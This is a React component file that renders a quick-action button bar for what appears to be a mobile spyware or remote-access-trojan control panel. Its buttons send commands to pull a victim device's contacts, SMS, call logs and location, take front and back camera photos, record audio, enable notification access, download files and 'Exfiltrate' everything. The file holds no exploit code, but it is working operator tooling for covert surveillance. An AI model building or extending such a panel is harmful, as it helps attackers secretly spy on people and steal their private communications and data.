import {
  FiUsers,
  FiMessageSquare,
  FiPhone,
  FiMapPin,
  FiCamera,
  FiMic,
  FiSmartphone,
  FiRefreshCw,
  FiDownload,
  FiBell,
} from "react-icons/fi";

const actions = [
  {
    id: "get_contacts",
    label: "Contacts",
    icon: FiUsers,
    color: "from-blue-500 to-blue-600",
  },
  {
    id: "get_sms",
    label: "SMS",
    icon: FiMessageSquare,
    color: "from-green-500 to-green-600",
  },
  {
    id: "get_call_logs",
    label: "Call Logs",
    icon: FiPhone,
    color: "from-purple-500 to-purple-600",
  },
  {
    id: "get_location",
    label: "Location",
    icon: FiMapPin,
    color: "from-red-500 to-red-600",
  },
  {
    id: "take_photo_back",
    label: "Back Cam",
    icon: FiCamera,
    color: "from-indigo-500 to-indigo-600",
  },
  {
    id: "take_photo_front",
    label: "Front Cam",
    icon: FiCamera,
    color: "from-pink-500 to-pink-600",
  },
  {
    id: "record_audio",
    label: "Record",
    icon: FiMic,
    color: "from-orange-500 to-orange-600",
  },
  {
    id: "get_device_info",
    label: "Device Info",
    icon: FiSmartphone,
    color: "from-cyan-500 to-cyan-600",
  },
  {
    id: "refresh_data",
    label: "Refresh",
    icon: FiRefreshCw,
    color: "from-teal-500 to-teal-600",
  },
  {
    id: "exfiltrate_all",
    label: "Exfiltrate",
    icon: FiDownload,
    color: "from-pink-500 to-pink-600",
  },
  {
    id: "download_file",
    label: "Download",
    icon: FiDownload,
    color: "from-green-500 to-green-600",
  },
  {
    id: "enable_notification_listener",
    label: "Notif Access",
    icon: FiBell,
    color: "from-yellow-500 to-yellow-600",
  },
];

export default function QuickActions({ onCommand }) {
  return (
    <div className="glass-effect rounded-2xl p-4">
      <div className="flex gap-3 overflow-x-auto pb-2">
        {actions.map(({ id, label, icon: Icon, color }) => (
          <button
            key={id}
            onClick={() => onCommand(id)}
            className="flex-shrink-0 flex flex-col items-center gap-2 p-3 rounded-xl bg-dark-700/30 border border-dark-600/50 hover:border-primary-500/30 transition-all card-hover"
          >
            <div
              className={`w-10 h-10 rounded-lg bg-gradient-to-br ${color} flex items-center justify-center`}
            >
              <Icon className="text-white" />
            </div>
            <span className="text-xs whitespace-nowrap">{label}</span>
          </button>
        ))}
      </div>
    </div>
  );
}
